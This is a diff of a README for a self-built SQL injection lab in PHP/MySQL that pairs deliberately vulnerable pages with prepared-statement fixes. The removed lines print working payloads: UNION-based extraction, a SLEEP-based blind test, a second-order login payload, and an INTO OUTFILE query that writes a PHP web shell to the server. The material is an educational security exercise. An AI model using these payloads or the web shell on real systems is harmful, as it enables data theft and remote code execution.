@@ -1,98 +1,171 @@
-# Advanced-SQL-Injection-Lab
+# Advanced SQL Injection Lab
 
-A hands-on lab exploring advanced SQL injection techniques (Error-based, Time-blind, and Second-order) including exploitation and secure mitigation strategies.
+Offensive Testing & Secure Coding Demonstration
 
+🔍 Project Summary
 
-📌 Project Overview
-This repository documents a hands-on cybersecurity lab focused on advanced SQL Injection (SQLi) techniques. The lab demonstrates how to identify and exploit vulnerabilities within a custom-built PHP/MySQL web application and provides the necessary secure coding mitigations.
+This project demonstrates how SQL Injection vulnerabilities occur in web applications and how to properly mitigate them using secure coding practices.
 
-🏗️ Lab Environment
-OS: Kali Linux
+The lab intentionally includes vulnerable components alongside secure implementations to show:
 
-Server Stack: XAMPP for Linux 8.6.30-0 (Apache & MySQL)
+* How attackers exploit SQL Injection flaws
+* How insecure database queries expose sensitive data
+* How to fix these issues using prepared statements and defensive coding
 
-Database: vulnerable_db
-
-Application: PHP-based web application consisting of registration, login, and product search modules.
-
-🚩 Phase 1: Exploitation Walkthrough
-
-1. Error-Based SQL Injection
-File: search.php
-
-Objective: Extract sensitive database metadata via the search interface.
+This project highlights both **offensive security awareness** and **defensive engineering skills**.
 
 
-Payloads Used:
+🎯 What This Project Demonstrates
 
-Database Version: ' UNION SELECT NULL, version(), NULL #
+* Authentication bypass exploitation
+* UNION-based data extraction
+* Error-based SQL Injection
+* Conceptual blind SQL Injection techniques
+* Secure implementation using parameterized queries
+* Input validation and proper error handling
 
-Result: Extracted version 10.4.32-MariaDB.
 
-Database Name: ' UNION SELECT NULL, database(), NULL #
+🧠 Real-World Relevance
 
-Result: Confirmed name vulnerable_db.
+SQL Injection remains one of the most critical web vulnerabilities and is consistently listed in the OWASP Top 10.
 
-Current User: ' UNION SELECT NULL, user(), NULL #
+Improper handling of user input can lead to:
 
-Result: Confirmed user root@localhost.
+* Credential compromise
+* Full database exposure
+* Privilege escalation
+* Data manipulation or deletion
 
-2. Time-Based Blind SQL Injection
-File: login.php
+This lab simulates these risks in a controlled environment and demonstrates practical remediation strategies.
 
-Objective: Verify vulnerability when no data is returned to the UI by observing server response times.
 
-Payload: admin' AND SLEEP(5) #
 
-Result: The application experienced a 5-second delay before responding, confirming the injection point.
+🏗 Technical Stack
 
-3. Second-Order SQL Injection
-File: register.php
+* PHP
+* MySQL
+* Apache (XAMPP for local testing)
 
-Objective: Inject a malicious payload during registration that is stored and executed by the system at a later stage.
 
-Payload: admin'--
 
-4. Advanced Exploitation (RCE)
-Objective: Achieve Remote Code Execution by writing a web shell to the server using the INTO OUTFILE command.
+📂 Architecture Overview
 
-Payload: ' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/opt/lampp/htdocs/vulnerable_app/shell.php' #
+The project is structured to compare insecure and secure implementations side by side:
 
-🛡️ Phase 2: Mitigation Strategies
-The most effective defense against these attacks is replacing dynamic SQL queries with Prepared Statements.
+* `db.php` – Vulnerable database interaction
+* `db_secure.php` – Secure implementation using prepared statements
+* `login.php` – Vulnerable authentication logic
+* `search.php` – Vulnerable search query
+* `search_secure.php` – Hardened search functionality
 
-Vulnerable Code Example:
+This structure makes it easy to analyze risk and mitigation in context.
 
-PHP
-$sql = "SELECT * FROM users WHERE username = '$username'"; 
-Secure Mitigation (PHP MySQLi):
 
-PHP
-$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
-$stmt->bind_param("s", $username);
+🧪 Vulnerability Demonstrations
+
+1️⃣ Authentication Bypass
+
+The login form is intentionally vulnerable to unsanitized input.
+
+Impact:
+
+* Bypasses authentication logic
+* Grants unauthorized access
+
+Root Cause:
+
+* Direct concatenation of user input into SQL queries
+
+
+
+2️⃣ UNION-Based SQL Injection
+
+Demonstrates how attackers can extract additional database information by manipulating query structure.
+
+Impact:
+
+* Database enumeration
+* Sensitive data disclosure
+
+
+
+3️⃣ Error-Based Injection
+
+Illustrates how verbose database error messages can reveal internal database structure.
+
+Impact:
+
+* Schema disclosure
+* Reconnaissance for further exploitation
+
+
+
+4️⃣ Secure Remediation
+
+Secure versions implement:
+
+* Prepared statements
+* Parameter binding
+* Reduced error exposure
+* Safer query construction
+
+Example:
+
+```php
+$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
+$stmt->bind_param("ss", $username, $password);
 $stmt->execute();
-$result = $stmt->get_result();
-
-⚖️ Ethical Disclaimer
-This project was performed in a controlled, local environment for educational purposes. Unauthorized testing against external systems is illegal and unethical.
-
-🧠 Final Reflection & Key Learnings
-Technical Growth
-
-Vulnerability Analysis: Gained a deep understanding of how unsanitized user input in PHP can lead to critical database compromises.
+```
 
 
-Advanced Exploitation: Successfully executed complex payloads, including Time-based Blind SQLi and Remote Code Execution (RCE) via INTO OUTFILE.
+🔐 Security Improvements Applied
+
+* Eliminated dynamic query concatenation
+* Enforced parameterized statements
+* Demonstrated separation between vulnerable and secure modules
+* Reduced information leakage through controlled error handling
 
 
-Defensive Coding: Mastered the implementation of Prepared Statements (Parameterized Queries) as the industry-standard defense against SQL injection.
 
-Challenges Overcome
+🚀 Setup Instructions
 
-Environment Setup: Configured the XAMPP stack on Linux and resolved database permission issues to allow for file writing during the RCE phase.
+1. Clone the repository
+2. Move it into your web server directory (e.g., `htdocs`)
+3. Create a MySQL database
+4. Update `config.php` with your database credentials
+5. Start Apache & MySQL
+6. Access via `http://localhost/Advanced-SQL-Injection-Lab/`
 
 
-Payload Precision: Learned the importance of exact syntax and URL encoding when bypasssing web filters and interacting with the MySQL backend.
 
-Professional Impact
-This lab has significantly enhanced my skills in Web Application Security and Digital Forensics. It provided practical experience in the "Identify, Exploit, and Patch" workflow used by professional penetration testers.
+📈 Professional Value
+
+This project demonstrates:
+
+* Understanding of web application attack vectors
+* Ability to identify insecure coding patterns
+* Knowledge of secure development practices
+* Practical application of OWASP principles
+
+
+
+⚠️ Ethical Use Notice
+
+This project is strictly for educational and defensive security training.
+Testing must only be performed in authorized environments.
+
+
+
+📌 Future Enhancements
+
+* Add Dockerized environment
+* Implement role-based access control
+* Add logging and monitoring features
+* Expand blind SQL Injection scenarios
+* Include automated security testing
+
+
+
+👤 Author
+
+Developed as part of a hands-on web security and secure coding study.
